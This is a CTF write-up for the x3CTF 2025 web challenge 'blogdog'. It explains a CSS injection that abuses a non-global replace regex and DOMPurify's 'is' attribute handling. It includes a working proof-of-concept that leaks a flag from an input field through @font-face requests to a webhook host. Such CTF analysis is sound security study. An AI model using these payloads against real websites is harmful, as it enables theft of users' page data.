---
title: "x3CTF blogdog(web) Write up"
description: "A detailed write up of the CTF challenge blogdog from x3CTF 2025, involving xs-leak technique CSS exfiltration and interesting DOMPurify + browser quirks. "
date: "Jan 31 2025"
tags: ["write up", "ctf", "xs-leaks"]
---

### Introduction
~~Attracted by the prizes~~, I played the x3CTF (feat. mvm) with Black Bauhinia, solving a few web challenges. Of the challenges we solved, I enjoyed blogdog(a hard web) the most, and hence this write up.

### Challenge Code
```html=
<script type="text/javascript" nonce="za/WhVaozTMdihyuNF+2+w==">
	const SAMPLE_ARTICLE = "...";

	const input = document.getElementById("input");
	const output = document.getElementById("output");
	const flag = document.getElementById("flag");

	const purifyConfig = {
		ALLOWED_ATTR: [],
		ALLOWED_TAGS: ["a", "b", "i", "s", "p", "br", "div", "h1", "h2", "h3", "strike", "strong"],
		ALLOW_ARIA_ATTR: false,
		ALLOW_DATA_ATTR: false,
	}

	function loadHtml(html) {
		const sanitized = DOMPurify.sanitize(html.replace(/["'&]/g,''), purifyConfig).replace(/["'&]/,'');
		output.innerHTML = `<h2>Sanitized HTML</h2><div id="sanitized"><style nonce="za/WhVaozTMdihyuNF+2+w==">#sanitized:before { font-family: monospace; color: #224; content: "${sanitized.replace(/([\\/\n\r\f])/g,'\\$1')}" }</style></div><hr><h2>Rendered HTML</h2>${sanitized}<hr>`;
	}

	input.oninput = () => loadHtml(input.value);
	flag.oninput = () => localStorage.setItem("flag", flag.value);

	window.onload = () => {
		flag.setAttribute('value', localStorage.getItem("flag") ?? "x3c{fake_flag}")
		input.value = decodeURI(window.location.search).replace(/^\?/,'') || SAMPLE_ARTICLE;
		loadHtml(input.value);
	}
</script>
```

### Observations

After looking at the source code, we got the following clues:
1. It is likely a [XS-leak](https://xsleaks.dev/) attack, specifically a [CSS exfiltration attack](https://portswigger.net/research/blind-css-exfiltration)(due to the strict tag whitelist and user input in css)
2. The flag is stored in a HTML `<input>` tag, further confirming our assumption of this challenge being a CSS exfil one
3. The code injects user input into the content property of pseudo-elment `#sanitized:before`: 
```css
content: "${sanitized.replace(/([\\/\n\r\f])/g,'\\$1')}"
```

This means that if we were to somehow break out of the quotes `"`, then we can inject aribrary CSS injection.

What do we do to figure out how to escape the string? Fuzzing, of course!

### Doing the challenge

After some fuzzing, we found that the form feed character, `%0c` is not included in the regex, and helps escape the string.

If you tried to test that yourself, you might have found that it doesn't actually work, the regex actually includes `\f`, which is the form feed character!

That's because the author forgot to update the challenge attachments, and after opening a ticket, we figured out that was exactly the case.

So back to square one, it doesn't seem like there are more characters which can break the string and are not blacklisted... Back to reading the source code...

```js
const sanitized = DOMPurify.sanitize(html.replace(/["'&]/g,''), purifyConfig).replace(/["'&]/,'');
```

After feeling extremely puzzled for a while, we found that the regex in the second replace function lacked the global flag, meaning it would only replace the first match, but not any other occurences after that.

This meant that if the output from DOMPurify contained two double quotes `"`, only the first one would be removed. But how do we get DOMPurify to output two double quotes, if the first replacement function prohibits that, AND the `ALLOWED_ATTR` array is set to empty?

Looking at the recent fixes for DOMPurify, we see that there is a patch which includes a comment saying that `"is"` attributes may be unremovable! This means that due to how DOMPurify works, making every empty attribute be a string instead of boolean, it would set the `is` attribute's value to `is=""`, providing the double quotes we need.
*[psst, I recently found a DOMPurify bypass in version 3.2.3, go check that out](/posts/dompurify-323-bypass/)*
```diff
+     // We void attribute values for unremovable "is" attributes
+     if (name === 'is') {
```

We can test that out with `?<div%20is>}%20body{%20background:%20red;}`, and the css does indeed apply.

```css
/* This is what is rendered on the browser */
#sanitized:before { 
    font-family: monospace; 
    color: #224; 
    content: "<div is=">} body{ background: red;}<\/div>" 
}
```

This means that now we can inject arbitrary CSS, and just have to craft a payload for CSS exfiltration. However, note that the following CSP is applied in the `index.js` file, preventing CSS exfiltration via the `background` source.

```js
res.setHeader('Content-Security-Policy', `script-src 'self' 'nonce-${nonce}'; style-src 'nonce-${nonce}'; object-src 'none'; img-src 'none';`);
```

If you do a little bit of googling, you will find that for CSS exfiltration, we usually either exfiltrate via background urls or font urls, since background sources are not permitted by the csp, we have to use `font-src`.

*[Jorian discovered a super interesting way of performing CSS exfiltration during the CTF, here is the write up](https://jorianwoltjer.com/blog/p/ctf/x3ctf-blogdog-new-css-injection-xs-leak)*

After some tinkering, I ended up with this function to leak the next character of the flag, given a prefix.
```js
function gen(prefix) {
  return `
                  @font-face {
 font-family: leak-${prefix[prefix.length - 1]};
 src: url(${hook}?q=${prefix[prefix.length - 1]});
}

    input[name="${name}"][value*="${prefix}"] {
              font-family: leak-${prefix[prefix.length - 1]};
            }`;
}
```

Careful readers may notice that the code actually removes the double quotes in the above code, moreover that makes us unable to use the `{` and `}` character because of how CSS syntax works.

Well does that mean we can't construct the prefix of `x3c{`, and can't get the flag? Well, not necessarily. We can guess from the middle or some part inside the flag, personally I decided to first look for the underscore `_` character, as it is one of the most commonly found characters in a CTF flag.

After getting the portion of the flag after the first underscore `_` character, we can actually modify the payload to exfiltrate the suffix instead of the prefix, and that is left as an exercise to the reader.

So this is the whole process for getting the flag.
1. Ensure a character of your choice is in the flag(by treating it as prefix), I will use `_` here
2. Leak the portion of flag after your chosen character --> `_****_****}`
3. Leak the portion of flag before your chosen character --> `{**_***_`
4. Combine the leaked portions to get `x3c{did_u_find_a_d0m9ur1fy_0d4y_0r_is_1t_ju57_4_51lly_br0w53r_qu1rk}`

### Thoughts
Overall, as someone who particularly enjoys these type of webs, it was a pretty fun challenge, and I recommend the reader to go try it for themselves. Though one piece of criticism is that the rate limit was set too high, at 1 request per minute, which was not helping given that the flag is 68 characters long.

### PoC
```js=
// This might not be fully functional
// I modified it multiple times during the contest
const hook = "https://webhook.site/...",
  name = "flag";

function gen(prefix) {
  return `
                  @font-face {
 font-family: leak-${prefix[prefix.length - 1]};
 src: url(${hook}?q=${prefix[prefix.length - 1]});
}

    input[name="${name}"][value*="${prefix}"] {
              font-family: leak-${prefix[prefix.length - 1]};
            }`;
}


// const upper_alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const lower_alpha = "abcdefghijklmnopqrstuvwxyz";
const digits = "0123456789";
const symbols = "_";

const charset = lower_alpha + digits + symbols;
const prefix = "...",
  res = [];

for (let i = 0; i < charset.length; i++) {
  res.push(
    gen(prefix + charset[i])
      .replace(/\s+/g, " ")
      .trim()
  );
}

const payload = ("<div is>}" + res.join("\n")).replaceAll(" ", "%20");

const myHeaders = new Headers();
myHeaders.append("Content-Type", "application/x-www-form-urlencoded");

const urlencoded = new URLSearchParams();
urlencoded.append("content", "http://localhost:3000/?" + payload);

const requestOptions = {
  method: "POST",
  headers: myHeaders,
  body: urlencoded,
  redirect: "follow",
};

function f() {
  // auto re-fetch in case of rate limit
  fetch(
    "https://uuid.x3c.tf:1337/",
    requestOptions
  )
    .then((response) => response.text())
    .then((result) => {
      console.log(result);
      if (result.startsWith("Error")) {
        setTimeout(() => {
          f();
        }, 5000);
      }
    })
    .catch((error) => console.error(error));
}

f();
```